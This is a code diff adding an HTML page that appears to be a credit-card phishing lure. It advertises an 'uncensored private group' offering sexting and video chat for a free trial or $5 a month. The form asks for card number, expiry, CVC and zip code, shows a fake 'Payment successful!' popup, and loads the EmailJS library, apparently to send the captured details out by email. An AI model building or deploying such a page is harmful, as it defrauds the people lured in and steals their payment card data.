@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Join Private Group</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Pictures, videos, sexting, video chatting!!</h1>
+    <h2>To access this uncensored private group, please select one of the following options to join:</h2>
+    <div class="buttons">
+      <button id="oneWeekButton">One week free trail</button>
+      <button id="oneMonthButton">$5/month</button>
+    </div>
+
+    <div id="cardDiv">
+      <h3 id="selectedOption"></h3>
+      <form id="cardForm">
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" required><br>
+
+        <div class="inline-inputs">
+          <input type="text" id="expDate" name="expDate" placeholder="MM/YY" required>
+          <input type="text" id="cvc" name="cvc" placeholder="CVC" required>
+          <input type="text" id="zipCode" name="zipCode" placeholder="Zip Code" required>
+        </div>
+
+        <button type="button" id="sendButton">Join Now</button>
+      </form>
+    </div>
+  </div>
+
+  <div id="overlay"></div>
+  <div id="popup">
+    <p>Payment successful!</p>
+    <button id="popupClose">OK</button>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
+
+
+
